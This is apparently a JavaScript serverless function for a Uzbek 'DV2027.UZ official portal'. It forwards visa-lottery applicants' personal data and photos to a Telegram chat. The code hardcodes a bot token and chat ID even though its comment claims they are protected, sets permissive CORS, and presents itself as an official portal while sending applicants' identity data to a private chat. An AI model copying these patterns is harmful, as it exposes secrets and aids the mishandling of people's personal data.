// Vercel Serverless Function - Telegram Submission Proxy
// Protects Telegram Bot Token and Chat ID securely via Environment Variables

export default async function handler(req, res) {
  // Enable CORS if needed
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN || '8749807918:AAF1D4uZqfOb9aF2NtGN9a5cNUL1NUom0tE';
  const chatId = process.env.TELEGRAM_CHAT_ID || '-1004332225482';

  try {
    const { formData, files } = req.body;
    if (!formData) {
      return res.status(400).json({ error: 'Missing formData' });
    }

    const escapeHtml = (str) => {
      if (!str) return '';
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
    };

    let text = `🇺🇸 <b>YANGI DV-2027 ANKETASI TUSHDI!</b>\n\n`;
    text += `🆔 <b>Ariza Kodi:</b> <code>${escapeHtml(formData.appId)}</code>\n`;
    text += `📅 <b>Vaqti:</b> ${escapeHtml(formData.date)}\n`;
    text += `--------------------------------------\n`;
    text += `👤 <b>ASOSIY ARIZACHI:</b>\n`;
    text += `• <b>F.I.SH:</b> ${escapeHtml(formData.applicant.lastName)} ${escapeHtml(formData.applicant.firstName)} ${escapeHtml(formData.applicant.middleName)}\n`;
    text += `• <b>Jinsi:</b> ${escapeHtml(formData.applicant.gender)}\n`;
    text += `• <b>Tug'ilgan sana:</b> ${escapeHtml(formData.applicant.birthDate)}\n`;
    text += `• <b>Tug'ilgan joyi:</b> ${escapeHtml(formData.applicant.country)}, ${escapeHtml(formData.applicant.region)}, ${escapeHtml(formData.applicant.city)}\n`;
    text += `• <b>Ta'lim:</b> ${escapeHtml(formData.applicant.education)}\n`;
    text += `• <b>Manzil:</b> ${escapeHtml(formData.applicant.address)}\n`;
    text += `• <b>Telefon:</b> <code>${escapeHtml(formData.applicant.phone)}</code>\n`;
    text += `• <b>Telegram:</b> ${escapeHtml(formData.applicant.telegram)}\n\n`;
    text += `💍 <b>Oilaviy holati:</b> ${escapeHtml(formData.maritalStatus)}\n`;

    if (formData.spouse) {
      text += `\n👰 <b>TURMUSH O'RTOG'I:</b>\n`;
      text += `• <b>F.I:</b> ${escapeHtml(formData.spouse.lastName)} ${escapeHtml(formData.spouse.firstName)}\n`;
      text += `• <b>Jinsi:</b> ${escapeHtml(formData.spouse.gender)}\n`;
      text += `• <b>Tug'ilgan sana:</b> ${escapeHtml(formData.spouse.birthDate)}\n`;
      text += `• <b>Tug'ilgan joyi:</b> ${escapeHtml(formData.spouse.country)}, ${escapeHtml(formData.spouse.birthPlace)}\n`;
      text += `• <b>Ta'limi:</b> ${escapeHtml(formData.spouse.education)}\n`;
    }

    if (formData.childrenCount > 0 && formData.children) {
      text += `\n👶 <b>FARZANDLARI (${formData.childrenCount} ta):</b>\n`;
      formData.children.forEach(c => {
        text += `• <b>${c.index}-bola:</b> ${escapeHtml(c.lastName)} ${escapeHtml(c.firstName)} | ${escapeHtml(c.gender)} | ${escapeHtml(c.birthDate)} | ${escapeHtml(c.birthPlace)}\n`;
      });
    }

    text += `\n--------------------------------------\n`;
    text += `⚡ <b>Tizim:</b> DV2027.UZ rasmiy portali\n`;

    // Inline action buttons
    const keyboardButtons = [];
    const rawTg = formData.applicant.telegram ? formData.applicant.telegram.replace('@', '').trim() : '';
    const rawPhone = formData.applicant.phone ? formData.applicant.phone.replace(/[^0-9]/g, '') : '';

    if (rawTg && rawTg !== 'Mavjud emas') {
      keyboardButtons.push([
        {
          text: `💬 Telegram orqali yozish (@${rawTg})`,
          url: `https://t.me/${rawTg}`
        }
      ]);
    }

    if (rawPhone) {
      keyboardButtons.push([
        {
          text: `📞 Tel orqali Telegram ochish (+${rawPhone})`,
          url: `https://t.me/+${rawPhone}`
        }
      ]);
    }

    // 1. Send Text Message
    const textPayload = {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    };

    if (keyboardButtons.length > 0) {
      textPayload.reply_markup = { inline_keyboard: keyboardButtons };
    }

    const textRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(textPayload)
    });

    // 2. Send Photos (if provided via base64)
    if (files && Array.isArray(files)) {
      for (const item of files) {
        if (!item.base64) continue;
        try {
          // Remove base64 data prefix if present (e.g., data:image/jpeg;base64,)
          const base64Data = item.base64.replace(/^data:image\/\w+;base64,/, '');
          const buffer = Buffer.from(base64Data, 'base64');
          const blob = new Blob([buffer], { type: item.type || 'image/jpeg' });

          const formDataFile = new FormData();
          formDataFile.append('chat_id', chatId);
          formDataFile.append('document', blob, item.name || 'photo.jpg');
          if (item.caption) {
            formDataFile.append('caption', item.caption);
          }

          await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: 'POST',
            body: formDataFile
          });
        } catch (photoErr) {
          console.error("Error sending photo to Telegram:", photoErr);
        }
      }
    }

    return res.status(200).json({ ok: true, appId: formData.appId });
  } catch (err) {
    console.error("API submission error:", err);
    return res.status(500).json({ error: 'Internal server error', details: err.message });
  }
}
